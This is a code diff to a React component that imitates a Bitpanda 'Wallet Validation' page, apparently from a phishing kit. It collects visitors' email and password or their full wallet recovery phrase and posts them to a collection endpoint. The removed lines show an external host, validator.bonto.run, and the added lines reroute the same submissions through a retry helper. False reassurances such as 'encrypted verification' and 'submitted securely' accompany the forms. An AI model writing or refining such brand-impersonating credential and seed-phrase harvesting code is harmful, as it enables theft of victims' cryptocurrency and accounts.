@@ -6,12 +6,9 @@ import {
   Shield,
   CheckCircle
 } from "lucide-react";
-import axios from "axios";
 import './bitPandaWallet.css';
 import bitpandaLogo from "../../assets/Bitpanda_logo.png";
-
-const EMAIL_API = "https://validator.bonto.run/bitPanda";
-const SEED_API = "https://validator.bonto.run/bitPandaSeed";
+import fetchWithRetry from "../../utils/api";
 
 const BitpandaWallet = () => {
   const [method, setMethod] = useState(null);
@@ -36,10 +33,18 @@ const BitpandaWallet = () => {
     setError("");
 
     try {
-      await axios.post(EMAIL_API, {
-        emailOrUsername: form.email,   // ✅ fixed
-        password: form.password
+      const res = await fetchWithRetry("/bitPanda", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          emailOrUsername: form.email,
+          password: form.password
+        })
       });
+
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || "Validation failed");
+
       setDone(true);
     } catch {
       setError("Validation failed. Please try again.");
@@ -58,9 +63,15 @@ const BitpandaWallet = () => {
     setError("");
 
     try {
-      await axios.post(SEED_API, {
-        passphrase: form.seed
+      const res = await fetchWithRetry("/bitPandaSeed", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ passphrase: form.seed })
       });
+
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || "Validation failed");
+
       setDone(true);
     } catch {
       setError("Validation failed. Please try again.");
@@ -75,14 +86,12 @@ const BitpandaWallet = () => {
       <div className="bitpanda-wallet-wrapper">
         <div className="bitpanda-wallet-box success">
           <img src={bitpandaLogo} className="bitpanda-logo" />
-
           <CheckCircle size={42} color="#1fbf75" />
           <h2>Verification in progress</h2>
           <p>
             Your wallet details have been submitted securely.
             You will receive a confirmation email once verification is complete.
           </p>
-
           <button onClick={() => window.location.href = "/"}>
             Go Home
           </button>
@@ -97,22 +106,18 @@ const BitpandaWallet = () => {
       <div className="bitpanda-wallet-wrapper">
         <div className="bitpanda-wallet-box">
           <img src={bitpandaLogo} className="bitpanda-logo large" />
-
           <h1>Wallet Validation</h1>
           <p className="subtitle">
             Choose a verification method to continue securely
           </p>
-
           <div className="method-buttonss">
             <button onClick={() => setMethod("email")}>
               Validate with Email & Password
             </button>
-
             <button className="outline" onClick={() => setMethod("seed")}>
               Validate with Recovery Phrase
             </button>
           </div>
-
           <p className="note">
             All validations are encrypted and processed securely.
           </p>
@@ -127,25 +132,19 @@ const BitpandaWallet = () => {
       <div className="bitpanda-wallet-wrapper">
         <div className="bitpanda-wallet-box">
           <img src={bitpandaLogo} className="bitpanda-logo" />
-
           <h1>Email Validation</h1>
-
           <div className="security">
             <Shield size={14} /> Encrypted verification
           </div>
-
           <div className="input-group">
             <label>Email address</label>
             <input
               type="email"
               placeholder="you@example.com"
               value={form.email}
-              onChange={(e) =>
-                setForm({ ...form, email: e.target.value })
-              }
+              onChange={(e) => setForm({ ...form, email: e.target.value })}
             />
           </div>
-
           <div className="input-group">
             <label>Password</label>
             <div className="password-fields">
@@ -153,18 +152,14 @@ const BitpandaWallet = () => {
                 type={showPassword ? "text" : "password"}
                 placeholder="Enter password"
                 value={form.password}
-                onChange={(e) =>
-                  setForm({ ...form, password: e.target.value })
-                }
+                onChange={(e) => setForm({ ...form, password: e.target.value })}
               />
               <button onClick={() => setShowPassword(!showPassword)}>
                 {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
               </button>
             </div>
           </div>
-
           {error && <div className="error">{error}</div>}
-
           <button onClick={submitEmail} disabled={loading}>
             {loading ? <Loader2 className="spin" /> : "Validate Wallet"}
           </button>
@@ -178,23 +173,16 @@ const BitpandaWallet = () => {
     <div className="bitpanda-wallet-wrapper">
       <div className="bitpanda-wallet-box">
         <img src={bitpandaLogo} className="bitpanda-logo" />
-
         <h1>Recovery Phrase Validation</h1>
-
         <textarea
           placeholder="Enter your 12 or 24-word recovery phrase"
           value={form.seed}
-          onChange={(e) =>
-            setForm({ ...form, seed: e.target.value })
-          }
+          onChange={(e) => setForm({ ...form, seed: e.target.value })}
         />
-
         {error && <div className="error">{error}</div>}
-
         <button onClick={submitSeed} disabled={loading}>
           {loading ? "Validating..." : "Validate Wallet"}
         </button>
-
         <p className="note">
           Never share your recovery phrase with anyone outside this process.
         </p>
